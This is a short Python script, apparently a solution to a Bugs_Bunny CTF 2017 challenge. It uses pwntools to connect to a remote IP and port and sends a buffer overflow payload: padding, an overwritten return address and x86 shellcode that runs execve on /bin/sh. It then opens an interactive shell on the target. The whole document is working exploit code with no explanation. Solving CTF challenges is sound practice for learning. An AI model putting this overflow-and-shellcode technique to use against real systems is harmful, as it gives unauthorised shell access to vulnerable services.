#!/usr/bin/python


#Bugs_Bunny CTF 2017

from pwn import *


r = remote("54.153.19.139",5252)
ret = 0x804b028

SC = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

BUFF = "AAAAZZZZEEEERRRRTTTTYYYYUUUU"+p32(ret)+SC

r.sendline(BUFF)
r.interactive()